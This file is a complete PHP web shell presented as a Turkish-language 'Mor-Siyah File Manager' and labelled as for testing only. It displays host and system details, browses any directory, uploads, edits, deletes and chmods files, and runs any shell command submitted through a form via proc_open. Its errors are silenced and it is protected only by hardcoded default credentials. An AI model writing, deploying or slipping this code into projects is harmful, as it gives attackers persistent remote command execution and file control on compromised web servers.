<?php
/**
 * Mor-Siyah File Manager
 * Güvenli olmayan ortamlar için - SADECE TEST AMAÇLI
 */

error_reporting(0);
ini_set('display_errors', 0);

// Yetki kontrolü (isteğe bağlı)
$auth_user = 'admin';
$auth_pass = 'password123';

if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER'] != $auth_user || $_SERVER['PHP_AUTH_PW'] != $auth_pass) {
    header('WWW-Authenticate: Basic realm="File Manager"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Yetkisiz Erişim!';
    exit;
}

// Mevcut dizin
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_dir = realpath($current_dir) ?: $current_dir;

// Çalışma dizinini değiştir
chdir($current_dir);

// İşlemler
$message = '';
$message_type = 'success';

// Dosya yükleme
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $target_file = $current_dir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        $message = 'Dosya başarıyla yüklendi: ' . basename($_FILES['file']['name']);
    } else {
        $message = 'Dosya yükleme başarısız!';
        $message_type = 'error';
    }
}

// Dizin oluştur
if (isset($_POST['create_dir'])) {
    $dir_name = trim($_POST['dir_name']);
    if (!empty($dir_name)) {
        if (mkdir($current_dir . '/' . $dir_name, 0755)) {
            $message = 'Dizin oluşturuldu: ' . $dir_name;
        } else {
            $message = 'Dizin oluşturulamadı!';
            $message_type = 'error';
        }
    }
}

// Dosya oluştur
if (isset($_POST['create_file'])) {
    $file_name = trim($_POST['file_name']);
    $file_content = $_POST['file_content'] ?? '';
    if (!empty($file_name)) {
        if (file_put_contents($current_dir . '/' . $file_name, $file_content) !== false) {
            $message = 'Dosya oluşturuldu: ' . $file_name;
        } else {
            $message = 'Dosya oluşturulamadı!';
            $message_type = 'error';
        }
    }
}

// Dosya/Dizin sil
if (isset($_GET['delete'])) {
    $target = $current_dir . '/' . basename($_GET['delete']);
    if (file_exists($target)) {
        if (is_dir($target)) {
            if (rmdir($target)) {
                $message = 'Dizin silindi: ' . basename($_GET['delete']);
            } else {
                $message = 'Dizin silinemedi (içinde dosya var)!';
                $message_type = 'error';
            }
        } else {
            if (unlink($target)) {
                $message = 'Dosya silindi: ' . basename($_GET['delete']);
            } else {
                $message = 'Dosya silinemedi!';
                $message_type = 'error';
            }
        }
    }
}

// Dosya/Dizin yeniden adlandır
if (isset($_POST['rename'])) {
    $old = $current_dir . '/' . basename($_POST['old_name']);
    $new = $current_dir . '/' . basename($_POST['new_name']);
    if (file_exists($old) && !empty($_POST['new_name'])) {
        if (rename($old, $new)) {
            $message = 'Yeniden adlandırıldı: ' . basename($_POST['old_name']) . ' → ' . basename($_POST['new_name']);
        } else {
            $message = 'Yeniden adlandırılamadı!';
            $message_type = 'error';
        }
    }
}

// Chmod
if (isset($_POST['chmod'])) {
    $target = $current_dir . '/' . basename($_POST['chmod_target']);
    $perms = octdec(str_pad($_POST['chmod_perms'], 4, '0', STR_PAD_LEFT));
    if (file_exists($target)) {
        if (chmod($target, $perms)) {
            $message = 'Chmod başarılı: ' . substr(sprintf('%o', $perms), -4);
        } else {
            $message = 'Chmod başarısız!';
            $message_type = 'error';
        }
    }
}

// Dosya içeriğini düzenle
if (isset($_POST['save_file'])) {
    $file_path = $current_dir . '/' . basename($_POST['edit_file']);
    if (file_exists($file_path) && is_file($file_path)) {
        if (file_put_contents($file_path, $_POST['file_content_edit']) !== false) {
            $message = 'Dosya kaydedildi: ' . basename($_POST['edit_file']);
        } else {
            $message = 'Dosya kaydedilemedi!';
            $message_type = 'error';
        }
    }
}

// Komut çalıştır (proc_open ile)
$command_output = '';
if (isset($_POST['execute_cmd'])) {
    $cmd = $_POST['command'];
    if (!empty($cmd)) {
        $descriptorspec = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = proc_open($cmd, $descriptorspec, $pipes, $current_dir);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            $return_code = proc_close($process);
            $command_output = "Çıkış Kodu: $return_code\n\nSTDOUT:\n$stdout\n\nSTDERR:\n$stderr";
        } else {
            $command_output = "proc_open başarısız!";
        }
    }
}

// Dosya listesini al
$items = scandir($current_dir);
$files = [];
$dirs = [];

foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $full_path = $current_dir . '/' . $item;
    if (is_dir($full_path)) {
        $dirs[] = $item;
    } else {
        $files[] = $item;
    }
}

sort($dirs);
sort($files);
$items = array_merge($dirs, $files);

// Sistem bilgileri
$system_info = [
    'OS' => php_uname('s') . ' ' . php_uname('r'),
    'Hostname' => php_uname('n'),
    'Kullanıcı' => function_exists('get_current_user') ? get_current_user() : 'N/A',
    'PHP Versiyonu' => phpversion(),
    'Sunucu' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
    'Disk Kullanımı' => function_exists('disk_free_space') ? 
        round(disk_free_space($current_dir) / 1024 / 1024 / 1024, 2) . ' GB boş / ' . 
        round(disk_total_space($current_dir) / 1024 / 1024 / 1024, 2) . ' GB toplam' : 'N/A',
    'Zaman' => date('Y-m-d H:i:s'),
];

?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mor-Siyah File Manager</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #1a1a1a;
            color: #d4d4d4;
            font-family: 'Consolas', 'Courier New', monospace;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        .header {
            background: linear-gradient(135deg, #2d1b2d, #1a1a2e);
            padding: 20px;
            border: 1px solid #6a2b6a;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .header h1 {
            color: #b366b3;
            text-shadow: 0 0 20px rgba(179, 102, 179, 0.3);
            font-size: 28px;
            letter-spacing: 2px;
        }
        .system-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            background: rgba(26, 26, 46, 0.8);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #3d1f3d;
            margin-top: 10px;
        }
        .system-info .info-item {
            display: flex;
            flex-direction: column;
            padding: 5px;
        }
        .system-info .label {
            color: #8888aa;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .system-info .value {
            color: #c48cc4;
            font-size: 14px;
            font-weight: bold;
            word-break: break-all;
        }
        .pwd-bar {
            background: #1a1a2e;
            padding: 12px 20px;
            border: 1px solid #3d1f3d;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
        }
        .pwd-bar .path {
            color: #b366b3;
            font-weight: bold;
            font-size: 16px;
            word-break: break-all;
        }
        .pwd-bar .path span {
            color: #6a2b6a;
        }
        .pwd-bar .nav-links a {
            color: #c48cc4;
            text-decoration: none;
            padding: 5px 12px;
            border: 1px solid #3d1f3d;
            border-radius: 5px;
            margin-left: 8px;
            transition: all 0.3s;
            font-size: 13px;
        }
        .pwd-bar .nav-links a:hover {
            background: #3d1f3d;
            border-color: #6a2b6a;
        }
        .message {
            padding: 12px 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-weight: bold;
        }
        .message.success {
            background: #0d3d0d;
            border: 1px solid #1a6a1a;
            color: #6aff6a;
        }
        .message.error {
            background: #3d0d0d;
            border: 1px solid #6a1a1a;
            color: #ff6a6a;
        }
        .grid {
            display: grid;
            grid-template-columns: 1fr 300px;
            gap: 20px;
        }
        .file-list {
            background: rgba(26, 26, 46, 0.6);
            border: 1px solid #2d1b2d;
            border-radius: 10px;
            padding: 15px;
            min-height: 500px;
        }
        .file-list table {
            width: 100%;
            border-collapse: collapse;
        }
        .file-list th {
            text-align: left;
            padding: 10px 8px;
            border-bottom: 2px solid #3d1f3d;
            color: #8888aa;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .file-list td {
            padding: 8px;
            border-bottom: 1px solid #1a1a2e;
            font-size: 13px;
        }
        .file-list tr:hover {
            background: rgba(61, 31, 61, 0.3);
        }
        .file-list .icon {
            color: #6a2b6a;
            margin-right: 8px;
        }
        .file-list .dir-icon { color: #b366b3; }
        .file-list .file-icon { color: #6a6a8a; }
        .file-list .link {
            color: #c48cc4;
            text-decoration: none;
        }
        .file-list .link:hover {
            text-decoration: underline;
        }
        .file-list .actions {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
        }
        .file-list .actions a, .file-list .actions button {
            color: #8888aa;
            text-decoration: none;
            padding: 2px 8px;
            border: 1px solid #2d1b2d;
            border-radius: 3px;
            font-size: 11px;
            background: transparent;
            cursor: pointer;
            transition: all 0.3s;
        }
        .file-list .actions a:hover, .file-list .actions button:hover {
            background: #3d1f3d;
            border-color: #6a2b6a;
            color: #d4d4d4;
        }
        .file-list .actions .delete { border-color: #6a1a1a; color: #ff6a6a; }
        .file-list .actions .delete:hover { background: #6a1a1a; color: #fff; }
        .sidebar {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        .sidebar-box {
            background: rgba(26, 26, 46, 0.6);
            border: 1px solid #2d1b2d;
            border-radius: 10px;
            padding: 15px;
        }
        .sidebar-box h3 {
            color: #b366b3;
            font-size: 14px;
            margin-bottom: 12px;
            border-bottom: 1px solid #3d1f3d;
            padding-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .sidebar-box input, .sidebar-box select, .sidebar-box textarea {
            width: 100%;
            padding: 8px 10px;
            margin-bottom: 8px;
            background: #0d0d1a;
            border: 1px solid #2d1b2d;
            color: #d4d4d4;
            border-radius: 5px;
            font-family: inherit;
            font-size: 13px;
        }
        .sidebar-box input:focus, .sidebar-box textarea:focus, .sidebar-box select:focus {
            outline: none;
            border-color: #6a2b6a;
            box-shadow: 0 0 10px rgba(106, 43, 106, 0.2);
        }
        .sidebar-box textarea {
            min-height: 80px;
            resize: vertical;
        }
        .sidebar-box button, .btn {
            background: linear-gradient(135deg, #2d1b2d, #1a1a2e);
            color: #c48cc4;
            border: 1px solid #3d1f3d;
            padding: 8px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-family: inherit;
            font-size: 13px;
            transition: all 0.3s;
            width: 100%;
        }
        .sidebar-box button:hover, .btn:hover {
            background: #3d1f3d;
            border-color: #6a2b6a;
        }
        .sidebar-box .btn-group {
            display: flex;
            gap: 5px;
        }
        .sidebar-box .btn-group button {
            flex: 1;
        }
        .command-output {
            background: #0d0d1a;
            border: 1px solid #2d1b2d;
            border-radius: 5px;
            padding: 10px;
            margin-top: 10px;
            font-size: 12px;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 300px;
            overflow: auto;
            color: #6aff6a;
        }
        .edit-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .edit-modal.active {
            display: flex;
        }
        .edit-modal-content {
            background: #1a1a1a;
            border: 2px solid #6a2b6a;
            border-radius: 10px;
            padding: 30px;
            max-width: 800px;
            width: 90%;
            max-height: 80vh;
            overflow: auto;
        }
        .edit-modal-content h2 {
            color: #b366b3;
            margin-bottom: 15px;
        }
        .edit-modal-content textarea {
            width: 100%;
            min-height: 300px;
            background: #0d0d1a;
            border: 1px solid #2d1b2d;
            color: #d4d4d4;
            padding: 10px;
            font-family: inherit;
            font-size: 13px;
            resize: vertical;
        }
        .edit-modal-content .btn-group {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        .edit-modal-content .btn-group button {
            flex: 1;
            padding: 10px;
        }
        .btn-close {
            background: #6a1a1a !important;
            border-color: #6a1a1a !important;
            color: #fff !important;
        }
        .btn-close:hover {
            background: #8a1a1a !important;
        }
        @media (max-width: 768px) {
            .grid {
                grid-template-columns: 1fr;
            }
            .system-info {
                grid-template-columns: 1fr 1fr;
            }
            .pwd-bar {
                flex-direction: column;
                align-items: stretch;
            }
            .pwd-bar .nav-links {
                display: flex;
                flex-wrap: wrap;
                gap: 5px;
            }
            .pwd-bar .nav-links a {
                margin-left: 0;
                flex: 1;
                text-align: center;
            }
        }
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #0d0d1a;
        }
        ::-webkit-scrollbar-thumb {
            background: #3d1f3d;
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #6a2b6a;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1>🔮 Mor-Siyah File Manager</h1>
            <div class="system-info">
                <?php foreach ($system_info as $label => $value): ?>
                <div class="info-item">
                    <span class="label"><?php echo htmlspecialchars($label); ?></span>
                    <span class="value"><?php echo htmlspecialchars($value); ?></span>
                </div>
                <?php endforeach; ?>
            </div>
        </div>

        <!-- PWD Bar -->
        <div class="pwd-bar">
            <div class="path">
                📁 <span>PWD:</span> <?php echo htmlspecialchars($current_dir); ?>
            </div>
            <div class="nav-links">
                <a href="?dir=">🏠 Ana</a>
                <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>">⬆ Üst</a>
                <a href="#" onclick="location.reload();">🔄 Yenile</a>
            </div>
        </div>

        <!-- Message -->
        <?php if ($message): ?>
        <div class="message <?php echo $message_type; ?>">
            <?php echo htmlspecialchars($message); ?>
        </div>
        <?php endif; ?>

        <!-- Main Grid -->
        <div class="grid">
            <!-- File List -->
            <div class="file-list">
                <table>
                    <thead>
                        <tr>
                            <th>İsim</th>
                            <th>Boyut</th>
                            <th>İzin</th>
                            <th style="text-align: right;">İşlemler</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if ($current_dir !== '/'): ?>
                        <tr>
                            <td><a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" class="link">📂 ..</a></td>
                            <td>-</td>
                            <td>-</td>
                            <td></td>
                        </tr>
                        <?php endif; ?>
                        <?php foreach ($items as $item):
                            $full_path = $current_dir . '/' . $item;
                            $is_dir = is_dir($full_path);
                            $perms = fileperms($full_path);
                            $perms_str = substr(sprintf('%o', $perms), -4);
                            $size = $is_dir ? '-' : number_format(filesize($full_path), 0, ',', '.') . ' B';
                            $icon = $is_dir ? '📂' : '📄';
                            $icon_class = $is_dir ? 'dir-icon' : 'file-icon';
                            $link = $is_dir ? "?dir=" . urlencode($full_path) : "#";
                        ?>
                        <tr>
                            <td>
                                <?php if ($is_dir): ?>
                                <a href="<?php echo $link; ?>" class="link">
                                    <span class="icon <?php echo $icon_class; ?>"><?php echo $icon; ?></span>
                                    <?php echo htmlspecialchars($item); ?>
                                </a>
                                <?php else: ?>
                                <span class="icon <?php echo $icon_class; ?>"><?php echo $icon; ?></span>
                                <?php echo htmlspecialchars($item); ?>
                                <?php endif; ?>
                            </td>
                            <td><?php echo $size; ?></td>
                            <td><?php echo $perms_str; ?></td>
                            <td style="text-align: right;">
                                <div class="actions">
                                    <?php if (!$is_dir): ?>
                                    <a href="#" onclick="editFile('<?php echo htmlspecialchars($item); ?>')">✏️ Düzenle</a>
                                    <?php endif; ?>
                                    <form method="POST" style="display:inline;" onsubmit="return confirm('Emin misiniz?');">
                                        <input type="hidden" name="chmod_target" value="<?php echo htmlspecialchars($item); ?>">
                                        <input type="text" name="chmod_perms" value="<?php echo $perms_str; ?>" size="4" style="width:50px;display:inline;background:#0d0d1a;border:1px solid #2d1b2d;color:#d4d4d4;text-align:center;">
                                        <button type="submit" name="chmod" style="display:inline;width:auto;padding:2px 8px;font-size:11px;">🔒</button>
                                    </form>
                                    <form method="POST" style="display:inline;" onsubmit="return confirm('Emin misiniz?');">
                                        <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($item); ?>">
                                        <input type="text" name="new_name" placeholder="yeni isim" style="width:80px;display:inline;background:#0d0d1a;border:1px solid #2d1b2d;color:#d4d4d4;font-size:11px;padding:2px 5px;">
                                        <button type="submit" name="rename" style="display:inline;width:auto;padding:2px 8px;font-size:11px;">✏️</button>
                                    </form>
                                    <a href="?delete=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($current_dir); ?>" class="delete" onclick="return confirm('Kalıcı olarak silinsin mi?');">🗑 Sil</a>
                                </div>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>

            <!-- Sidebar -->
            <div class="sidebar">
                <!-- Upload -->
                <div class="sidebar-box">
                    <h3>📤 Dosya Yükle</h3>
                    <form method="POST" enctype="multipart/form-data">
                        <input type="file" name="file" required>
                        <button type="submit">Yükle</button>
                    </form>
                </div>

                <!-- Create Directory -->
                <div class="sidebar-box">
                    <h3>📁 Dizin Oluştur</h3>
                    <form method="POST">
                        <input type="text" name="dir_name" placeholder="Dizin adı" required>
                        <button type="submit" name="create_dir">Oluştur</button>
                    </form>
                </div>

                <!-- Create File -->
                <div class="sidebar-box">
                    <h3>📄 Dosya Oluştur</h3>
                    <form method="POST">
                        <input type="text" name="file_name" placeholder="Dosya adı" required>
                        <textarea name="file_content" placeholder="Dosya içeriği (opsiyonel)"></textarea>
                        <button type="submit" name="create_file">Oluştur</button>
                    </form>
                </div>

                <!-- Command Execution -->
                <div class="sidebar-box">
                    <h3>⚡ Komut Çalıştır</h3>
                    <form method="POST">
                        <input type="text" name="command" placeholder="Komut girin (örn: ls -la)" required>
                        <button type="submit" name="execute_cmd">Çalıştır</button>
                    </form>
                    <?php if ($command_output): ?>
                    <div class="command-output"><?php echo htmlspecialchars($command_output); ?></div>
                    <?php endif; ?>
                </div>
            </div>
        </div>
    </div>

    <!-- Edit Modal -->
    <div class="edit-modal" id="editModal">
        <div class="edit-modal-content">
            <h2>✏️ Dosya Düzenle</h2>
            <form method="POST">
                <input type="hidden" name="edit_file" id="editFileName">
                <textarea name="file_content_edit" id="editFileContent"></textarea>
                <div class="btn-group">
                    <button type="submit" name="save_file">💾 Kaydet</button>
                    <button type="button" class="btn-close" onclick="closeEditModal()">❌ Kapat</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        function editFile(filename) {
            // Dosya içeriğini AJAX ile al
            fetch('?dir=<?php echo urlencode($current_dir); ?>&get_file=' + encodeURIComponent(filename))
                .then(response => response.text())
                .then(content => {
                    document.getElementById('editFileName').value = filename;
                    document.getElementById('editFileContent').value = content;
                    document.getElementById('editModal').classList.add('active');
                })
                .catch(err => {
                    alert('Dosya okunamadı: ' + err);
                });
        }

        function closeEditModal() {
            document.getElementById('editModal').classList.remove('active');
        }

        // Modal dışına tıklanınca kapat
        document.getElementById('editModal').addEventListener('click', function(e) {
            if (e.target === this) closeEditModal();
        });

        // ESC ile kapat
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') closeEditModal();
        });

        // AJAX ile dosya içeriğini getir
        <?php if (isset($_GET['get_file'])): ?>
        <?php
        $get_file = basename($_GET['get_file']);
        $file_path = $current_dir . '/' . $get_file;
        if (file_exists($file_path) && is_file($file_path) && is_readable($file_path)) {
            echo file_get_contents($file_path);
        } else {
            echo 'Dosya okunamıyor veya mevcut değil.';
        }
        exit;
        ?>
        <?php endif; ?>
    </script>
</body>
</html>